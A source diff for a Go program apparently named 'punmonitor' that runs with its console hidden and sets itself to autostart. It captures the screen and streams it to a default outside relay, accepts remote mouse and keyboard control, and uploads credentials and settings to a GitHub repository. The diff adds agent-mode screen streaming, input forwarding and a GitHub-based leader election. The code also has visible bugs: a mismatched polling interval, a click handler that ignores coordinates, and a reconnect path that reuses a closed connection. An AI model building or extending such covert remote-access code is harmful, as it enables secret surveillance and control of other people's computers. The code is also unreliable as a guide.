@@ -31,15 +31,27 @@ import (
 
 var startTime = time.Now()
 
+var (
+	myHostname   string
+	agentConnsMu sync.RWMutex
+	agentConns   = make(map[string]*websocket.Conn)
+	connAgentID  = make(map[*websocket.Conn]string)
+)
+
 type WireMessage struct {
-	Type    string `json:"type"`
-	Data    []byte `json:"data"`
-	AgentID string `json:"agentId,omitempty"`
+    Type    string `json:"type"`
+    Data    []byte `json:"data,omitempty"`
+    AgentID string `json:"agentId,omitempty"`
+    Server  bool   `json:"server,omitempty"`
 }
+
 
 const MSG_FRAME = "frame"
 
 var wsClients sync.Map
+
+// activeAgents tracks which hostnames are already connected via WebSocket
+var activeAgents sync.Map // string → bool
 
 func (wm *WireMessage) Marshal() []byte {
 	data, _ := json.Marshal(wm)
@@ -210,6 +222,10 @@ var (
 	hiddenAgents sync.Map
 )
 
+// global flags and maps
+var agentMode bool
+var connAgentIDMu sync.RWMutex
+
 func getLocalIP() string {
 	addrs, err := net.InterfaceAddrs()
 	if err != nil { return "unknown" }
@@ -345,18 +361,9 @@ func startScreenCapture(ctx context.Context) {
 			if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 85}); err != nil {
 				continue
 			}
-			wm := WireMessage{Type: MSG_FRAME, Data: buf.Bytes(), AgentID: getHostname()}
-			// Broadcast via WebSocket
-			wsClients.Range(func(key, value interface{}) bool {
-				conn := key.(*websocket.Conn)
-				data := wm.Marshal()
-				if err := conn.WriteMessage(websocket.TextMessage, data); err != nil {
-					wsClients.Delete(key)
-				}
-				return true
-			})
-			// Broadcast via WebRTC data channels (primary — lower bandwidth)
-			webrtcManager.BroadcastFrame(&wm)
+				wm := WireMessage{Type: MSG_FRAME, Data: buf.Bytes(), AgentID: getHostname()}
+				msg := wm.Marshal()
+				broadcastFrame(msg, &wm)
 		case <-ctx.Done():
 			return
 		}
@@ -372,6 +379,11 @@ func handleWSMessage(conn *websocket.Conn, msg []byte) {
 	switch msgType {
 	case "hello":
 		llog("info", "WebSocket client hello received")
+	case MSG_FRAME:
+		var wm WireMessage
+		if err := json.Unmarshal(msg, &wm); err == nil {
+			broadcastFrame(msg, &wm)
+		}
 	case "set_fps":
 		if fps, ok := msgMap["fps"].(float64); ok && fps > 0 {
 			cfg.MaxFPS = fps
@@ -419,26 +431,115 @@ func handleWSMessage(conn *websocket.Conn, msg []byte) {
 		candidate, _ := msgMap["candidate"].(string)
 		webrtcManager.HandleICE("", candidate)
 	case "mouse_move":
+		if target, ok := msgMap["agentId"].(string); ok && target != "" {
+			forwardToAgent(target, msg)
+			return
+		}
 		if x, ok := msgMap["x"].(float64); ok {
 			if y, ok := msgMap["y"].(float64); ok {
 				winMouseMove(int(x), int(y))
 			}
 		}
 	case "mouse_click":
+		if target, ok := msgMap["agentId"].(string); ok && target != "" {
+			forwardToAgent(target, msg)
+			return
+		}
 		btn, _ := msgMap["button"].(string)
-		x, _ := msgMap["x"].(float64)
-		y, _ := msgMap["y"].(float64)
-		winMouseClick(int(x), int(y), btn != "right")
+		winMouseClick(0, 0, btn != "right")
 	case "key_press":
+		if target, ok := msgMap["agentId"].(string); ok && target != "" {
+			forwardToAgent(target, msg)
+			return
+		}
 		if key, ok := msgMap["key"].(float64); ok {
 			winKeyPress(uint16(key))
 		}
 	default:
 		llog("debug", "Received WebSocket message type=%s", msgType)
 	}
+
 }
 
-// pushCredsToGitHub uploads current credentials and settings to the configured GitHub repo.
+func startGitHubLeaderElection() {
+    // Poll the primary_server.json file in the repo every 15 seconds
+    ticker := time.NewTicker(5 * time.Minute)
+    defer ticker.Stop()
+    for {
+        // 1️⃣ Read the file from GitHub (raw URL)
+        rawURL := fmt.Sprintf("https://raw.githubusercontent.com/%s/main/primary_server.json", cfg.GitHubRepo)
+        resp, err := http.Get(rawURL)
+        var leader struct {
+            Host    string `json:"host"`
+            Updated int64  `json:"updated"`
+        }
+        if err == nil && resp.StatusCode == http.StatusOK {
+            _ = json.NewDecoder(resp.Body).Decode(&leader)
+            resp.Body.Close()
+        }
+        // 2️⃣ Decide if we should become leader
+        now := time.Now().Unix()
+        stale := leader.Host == "" || now-leader.Updated > 300 // 5 min stale threshold
+        if stale {
+            // Try to claim leadership by committing a new primary_server.json
+            newLeader := struct {
+                Host    string `json:"host"`
+                Updated int64  `json:"updated"`
+            }{Host: myHostname, Updated: now}
+            payloadBytes, _ := json.Marshal(newLeader)
+            b64 := base64.StdEncoding.EncodeToString(payloadBytes)
+            apiURL := fmt.Sprintf("https://api.github.com/repos/%s/contents/primary_server.json", cfg.GitHubRepo)
+            body := map[string]string{
+                "message": "elect leader",
+                "content": b64,
+                "branch":  "main",
+            }
+            bodyJSON, _ := json.Marshal(body)
+            req, _ := http.NewRequest(http.MethodPut, apiURL, bytes.NewReader(bodyJSON))
+            req.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
+            req.Header.Set("Content-Type", "application/json")
+            // If the file already exists we need the SHA – attempt a GET first (cheap, low‑rate)
+            sha := ""
+            if getResp, err := http.Get(apiURL); err == nil && getResp.StatusCode == http.StatusOK {
+                var existing struct{ SHA string `json:"sha"` }
+                json.NewDecoder(getResp.Body).Decode(&existing)
+                getResp.Body.Close()
+                sha = existing.SHA
+            }
+            if sha != "" {
+                // include sha to update existing file
+                var tmp map[string]string
+                json.Unmarshal(bodyJSON, &tmp)
+                tmp["sha"] = sha
+                bodyJSON, _ = json.Marshal(tmp)
+                req.Body = io.NopCloser(bytes.NewReader(bodyJSON))
+                req.ContentLength = int64(len(bodyJSON))
+            }
+            if putResp, err := http.DefaultClient.Do(req); err == nil && putResp.StatusCode == 201 {
+                // Success – we are now the leader
+                llog("info", "Elected as server via GitHub primary_server file")
+                startServerComponents()
+                return // stop election loop; this instance remains server
+            }
+        }
+        // 3️⃣ If another host is leader and still fresh, just wait for next tick
+        select {
+        case <-ticker.C:
+        }
+    }
+}
+
+func startServerComponents() {
+    // Ensure tunnel is running if configured
+    if cfg.CloudflareTunnelID != "" {
+        go startCloudflareTunnel(cfg)
+    }
+    // Start HTTP server & screen capture (same as main's normal flow)
+    serverCtx, serverCancel = context.WithCancel(context.Background())
+    go startScreenCapture(serverCtx)
+    cfg.IsServerMode = true
+}
+
 func pushCredsToGitHub() {
 	if cfg.GitHubRepo == "" || cfg.GitHubToken == "" {
 		return
@@ -453,13 +554,14 @@ func pushCredsToGitHub() {
 			"branch":  "main",
 		})
 		url := fmt.Sprintf("https://api.github.com/repos/%s/contents/punmonitor-credentials.json", cfg.GitHubRepo)
-		req, _ := http.NewRequest("PUT", url, bytes.NewReader(payload))
+		req, err := http.NewRequest("PUT", url, bytes.NewReader(payload))
+		if err != nil { llog("error", "Failed to create request for credentials: %v", err); return }
 		req.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
 		req.Header.Set("Content-Type", "application/json")
-		if resp, err := http.DefaultClient.Do(req); err == nil {
-			resp.Body.Close()
-			llog("info", "Credentials pushed to GitHub")
-		}
+		resp, err := http.DefaultClient.Do(req)
+		if err != nil { llog("error", "Failed to push credentials: %v", err); return }
+		defer resp.Body.Close()
+		llog("info", "Credentials pushed to GitHub")
 	}
 	// Push settings.json
 	if settingsData, err := os.ReadFile(settingsFilePath()); err == nil {
@@ -470,13 +572,14 @@ func pushCredsToGitHub() {
 			"branch":  "main",
 		})
 		url := fmt.Sprintf("https://api.github.com/repos/%s/contents/settings.json", cfg.GitHubRepo)
-		req, _ := http.NewRequest("PUT", url, bytes.NewReader(payload))
+		req, err := http.NewRequest("PUT", url, bytes.NewReader(payload))
+		if err != nil { llog("error", "Failed to create request for settings: %v", err); return }
 		req.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
 		req.Header.Set("Content-Type", "application/json")
-		if resp, err := http.DefaultClient.Do(req); err == nil {
-			resp.Body.Close()
-			llog("info", "Settings pushed to GitHub")
-		}
+		resp, err := http.DefaultClient.Do(req)
+		if err != nil { llog("error", "Failed to push settings: %v", err); return }
+		defer resp.Body.Close()
+		llog("info", "Settings pushed to GitHub")
 	}
 }
 
@@ -533,7 +636,7 @@ func syncFromGitHub() {
 	llog("info", "Fetching credentials from GitHub: %s", rawURL)
 
 	req, err := http.NewRequest("GET", rawURL, nil)
-	if err != nil { return }
+	if err != nil { llog("error", "Failed to create request for credentials: %v", err); return }
 	if cfg.GitHubToken != "" {
 		req.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
 	}
@@ -586,7 +689,8 @@ func syncFromGitHub() {
 
 	// Also check for settings.json in the repo
 	settingsURL := fmt.Sprintf("https://raw.githubusercontent.com/%s/main/settings.json", cfg.GitHubRepo)
-	req2, _ := http.NewRequest("GET", settingsURL, nil)
+	req2, err := http.NewRequest("GET", settingsURL, nil)
+	if err != nil { llog("error", "Failed to create request for settings: %v", err); return }
 	if cfg.GitHubToken != "" {
 		req2.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
 	}
@@ -785,6 +889,8 @@ var defaultGitHubToken string
 var binaryVersion = "9.2.0"
 
 func main() {
+	// Start GitHub‑based leader election (primary_server file)
+	go startGitHubLeaderElection()
 	// Detach from any parent console — binary runs fully hidden
 	hideConsole()
 
@@ -838,6 +944,13 @@ func main() {
 	loadSettings()
 	loadCredentials()
 
+	myHostname = getHostname()
+
+	if agentMode {
+		go runAgentClient()
+		select {}
+	}
+
 	// Command-line flags override cached values
 	if defaultGitHubRepo != "" {
 		cfg.GitHubRepo = defaultGitHubRepo
@@ -855,18 +968,26 @@ func main() {
 	// Auto-install watchdog autostart on first successful run
 	setupAutostart()
 
-	if err := EnsureCloudflaredInstalled(); err != nil {
-		llog("error", "cloudflared setup: %v", err)
+	prov := cfg.TunnelProvider
+	if prov == "" {
+		prov = "cloudflare"
+	}
+
+	if prov == "cloudflare" {
+		if err := EnsureCloudflaredInstalled(); err != nil {
+			llog("error", "cloudflared setup: %v", err)
+		}
+		if cfg.CloudflareTunnelID != "" {
+			llog("info", "Cloudflare credentials found, starting tunnel automatically")
+			go startCloudflareTunnel(cfg)
+		}
+	} else {
+		llog("info", "Tunnel provider: %s (no cloudflared needed)", prov)
 	}
 
 	serverCtx, serverCancel = context.WithCancel(context.Background())
 	go startScreenCapture(serverCtx)
 	cfg.IsServerMode = true
-
-	if cfg.CloudflareTunnelID != "" {
-		llog("info", "Cloudflare credentials found, starting tunnel automatically")
-		go startCloudflareTunnel(cfg)
-	}
 
 	go startTransportMonitor(context.Background())
 
@@ -917,7 +1038,6 @@ func main() {
 				if s.AuthUser != "" { cfg.AuthUser = s.AuthUser }
 				if s.AuthPass != "" { cfg.AuthPass = s.AuthPass }
 	if s.TunnelProvider != "" { cfg.TunnelProvider = s.TunnelProvider }
-				if s.TunnelProvider != "" { cfg.TunnelProvider = s.TunnelProvider }
 				if s.TunnelHostname != "" { cfg.TunnelHostname = s.TunnelHostname }
 				if s.ServerURL != "" { cfg.ServerURL = s.ServerURL }
 				if s.CloudflareAccountTag != "" { cfg.CloudflareAccountTag = s.CloudflareAccountTag }
@@ -977,10 +1097,9 @@ func main() {
 				lastStartup = s["last_startup"]
 				lastShutdown = s["last_shutdown"]
 				lastActive = s["last_active"]
-				lastIdleStart = s["last_idle_start"]
+lastIdleStart = s["last_idle_start"]
 				lastWake = s["last_wake"]
 			}
-
 			writer := csv.NewWriter(w)
 			writer.Write([]string{
 				"Agent", "Hostname", "Local IP", "WAN IP",
@@ -1001,21 +1120,19 @@ func main() {
 			writer.Flush()
 		})
 
-		http.HandleFunc("/api/agents", func(w http.ResponseWriter, r *http.Request) {
-			w.Header().Set("Content-Type", "application/json")
-			json.NewEncoder(w).Encode([]string{getHostname()})
-		})
-
-		http.HandleFunc("/api/agents/full", func(w http.ResponseWriter, r *http.Request) {
-			w.Header().Set("Content-Type", "application/json")
-			var list []map[string]interface{}
-			v, _ := hiddenAgents.Load(getHostname())
-			list = append(list, map[string]interface{}{
-				"id":     getHostname(),
-				"hidden": v != nil && v.(bool),
-			})
-			json.NewEncoder(w).Encode(list)
-		})
+	http.HandleFunc("/api/agents/full", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		agentConnsMu.RLock()
+		list := make([]map[string]interface{}, 0, len(agentConns)+1)
+		for id := range agentConns {
+			list = append(list, map[string]interface{}{"id": id, "hidden": false})
+		}
+		agentConnsMu.RUnlock()
+		if _, exists := agentConns[myHostname]; !exists {
+			list = append(list, map[string]interface{}{"id": myHostname, "hidden": false})
+		}
+		json.NewEncoder(w).Encode(list)
+	})
 
 		http.HandleFunc("/api/hide-agent", func(w http.ResponseWriter, r *http.Request) {
 			if r.Method != "POST" {
@@ -1075,35 +1192,60 @@ func main() {
 			json.NewEncoder(w).Encode(map[string]string{"status": "ok", "msg": "Update started"})
 		})
 
-		http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
-			upgrader := websocket.Upgrader{
-				CheckOrigin: func(r *http.Request) bool { return true },
+	http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
+		upgrader := websocket.Upgrader{
+			CheckOrigin: func(r *http.Request) bool { return true },
+		}
+		conn, err := upgrader.Upgrade(w, r, nil)
+		if err != nil {
+			llog("error", "WebSocket upgrade failed: %v", err)
+			return
+		}
+		llog("info", "WebSocket client connected")
+
+		wsClients.Store(conn, true)
+		var agentID string
+		defer func() {
+			wsClients.Delete(conn)
+			if agentID != "" {
+				agentConnsMu.Lock()
+				delete(agentConns, agentID)
+				agentConnsMu.Unlock()
+				connAgentIDMu.Lock()
+				delete(connAgentID, conn)
+				connAgentIDMu.Unlock()
 			}
-			conn, err := upgrader.Upgrade(w, r, nil)
+			conn.Close()
+			llog("info", "WebSocket client disconnected")
+		}()
+
+		for {
+			_, msg, err := conn.ReadMessage()
 			if err != nil {
-				llog("error", "WebSocket upgrade failed: %v", err)
-				return
-			}
-			llog("info", "WebSocket client connected")
-
-			wsClients.Store(conn, true)
-			defer func() {
-				wsClients.Delete(conn)
-				conn.Close()
-				llog("info", "WebSocket client disconnected")
-			}()
-
-			for {
-				_, msg, err := conn.ReadMessage()
-				if err != nil {
-					if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
-						llog("error", "WebSocket read error: %v", err)
-					}
-					break
+				if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
+					llog("error", "WebSocket read error: %v", err)
 				}
-				handleWSMessage(conn, msg)
+				break
 			}
-		})
+			var msgMap map[string]interface{}
+			if err := json.Unmarshal(msg, &msgMap); err == nil {
+				if t, _ := msgMap["type"].(string); t == "hello" {
+					if a, _ := msgMap["agent"].(bool); a {
+						if id, _ := msgMap["agentId"].(string); id != "" {
+							agentID = id
+							agentConnsMu.Lock()
+							agentConns[agentID] = conn
+							agentConnsMu.Unlock()
+							connAgentIDMu.Lock()
+							connAgentID[conn] = agentID
+							connAgentIDMu.Unlock()
+						}
+					}
+				}
+			}
+			handleWSMessage(conn, msg)
+		}
+	})
 
 		addr := fmt.Sprintf(":%d", cfg.ConfigPort)
 		llog("info", "Starting HTTP server on %s", addr)
@@ -1686,17 +1828,17 @@ type webrtcTransport struct {
 }
 
 func NewWebRTCTransport(priority int) Transport {
-	return &webrtcTransport{
-		priority: priority,
-	}
+	return &webrtcTransport{priority: priority}
 }
 
 func (t *webrtcTransport) Send(wm *WireMessage) error {
-	return fmt.Errorf("webrtc transport not yet implemented")
+	// Use the manager's broadcast to all active data channels
+	webrtcManager.BroadcastFrame(wm)
+	return nil
 }
 
 func (t *webrtcTransport) Recv() (*WireMessage, error) {
-	return nil, fmt.Errorf("webrtc transport not yet implemented")
+	return nil, fmt.Errorf("webrtc transport receive not implemented")
 }
 
 func (t *webrtcTransport) Name() string    { return "webrtc" }
@@ -1738,13 +1880,13 @@ func (g *githubTransport) Send(wm *WireMessage) error {
 			"branch":  "main",
 		})
 		url := fmt.Sprintf("https://api.github.com/repos/%s/contents/frames/latest.json", g.repo)
-		req, _ := http.NewRequest("PUT", url, bytes.NewReader(payload))
+		req, err := http.NewRequest("PUT", url, bytes.NewReader(payload))
+		if err != nil { llog("error", "Failed to create request for GitHub transport: %v", err); return }
 		req.Header.Set("Authorization", "Bearer "+g.token)
 		req.Header.Set("Content-Type", "application/json")
 		resp, err := http.DefaultClient.Do(req)
-		if err == nil {
-			resp.Body.Close()
-		}
+		if err != nil { llog("error", "Failed to send frame to GitHub: %v", err); return }
+		defer resp.Body.Close()
 	}()
 	return nil
 }
@@ -1811,7 +1953,11 @@ func initTransports() {
 		healthChecker.Register("github")
 		llog("info", "GitHub fallback transport registered")
 	}
-}
+	// Register WebRTC transport with high priority (lower number = higher priority)
+	wt := NewWebRTCTransport(10)
+	transportPool.Add("webrtc", wt)
+	healthChecker.Register("webrtc")
+	llog("info", "WebRTC transport registered")}
 
 func getTransportStatus() map[string]interface{} {
 	best := transportPool.GetBest()
@@ -1897,6 +2043,111 @@ type WebRTCManager struct {
 
 var webrtcManager = NewWebRTCManager()
 var webrtcDataChannels sync.Map
+
+// --- Agent support functions ---
+
+func broadcastFrame(msg []byte, wm *WireMessage) {
+	connAgentIDMu.RLock()
+	defer connAgentIDMu.RUnlock()
+	wsClients.Range(func(key, value interface{}) bool {
+		conn := key.(*websocket.Conn)
+		if _, isAgent := connAgentID[conn]; isAgent {
+			return true // skip agent connections
+		}
+		if err := conn.WriteMessage(websocket.TextMessage, msg); err != nil {
+			wsClients.Delete(key)
+		}
+		return true
+	})
+	webrtcManager.BroadcastFrame(wm)
+}
+
+func forwardToAgent(agentID string, msg []byte) {
+	agentConnsMu.RLock()
+	conn, ok := agentConns[agentID]
+	agentConnsMu.RUnlock()
+	if !ok {
+		llog("warn", "agent %s not connected", agentID)
+		return
+	}
+	if err := conn.WriteMessage(websocket.TextMessage, msg); err != nil {
+		llog("error", "forward to agent %s failed: %v", agentID, err)
+	}
+}
+
+func runAgentClient() {
+	hostname := myHostname
+	if hostname == "" {
+		hostname = getHostname()
+	}
+	reconnectDelay := 5 * time.Second
+	for {
+		serverURL := cfg.ServerURL
+		if serverURL == "" {
+			serverURL = "https://relay.recruitedge.us"
+		}
+		wsURL := serverURL
+		if strings.HasPrefix(wsURL, "https://") {
+			wsURL = "wss://" + wsURL[len("https://"):]
+		} else if strings.HasPrefix(wsURL, "http://") {
+			wsURL = "ws://" + wsURL[len("http://"):]
+		}
+		wsURL += "/ws"
+		conn, _, err := (&websocket.Dialer{}).Dial(wsURL, nil)
+		if err != nil {
+			llog("error", "Agent connect to %s failed: %v", wsURL, err)
+			time.Sleep(reconnectDelay)
+			continue
+		}
+		hello, _ := json.Marshal(map[string]interface{}{
+			"type":    "hello",
+			"agentId": hostname,
+			"agent":   true,
+		})
+		if err := conn.WriteMessage(websocket.TextMessage, hello); err != nil {
+			conn.Close()
+			llog("error", "Agent send hello failed: %v", err)
+			time.Sleep(reconnectDelay)
+			continue
+		}
+		llog("info", "Agent connected to server as %s", hostname)
+
+		fps := cfg.MaxFPS
+		if fps <= 0 {
+			fps = 1
+		}
+		ticker := time.NewTicker(time.Duration(float64(time.Second) / fps))
+		for {
+			select {
+			case <-ticker.C:
+				img, err := captureScreen()
+				if err != nil {
+					continue
+				}
+				var buf bytes.Buffer
+				if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 85}); err != nil {
+					continue
+				}
+				wm := WireMessage{
+					Type:    MSG_FRAME,
+					Data:    buf.Bytes(),
+					AgentID: hostname,
+				}
+				msg, err := json.Marshal(wm)
+				if err != nil {
+					continue
+				}
+				if err := conn.WriteMessage(websocket.TextMessage, msg); err != nil {
+					llog("error", "Agent send frame failed: %v", err)
+					conn.Close()
+					goto reconnect
+				}
+			}
+		reconnect:
+			time.Sleep(reconnectDelay)
+		}
+	}
+}
 
 func NewWebRTCManager() *WebRTCManager {
 	s := webrtc.SettingEngine{}
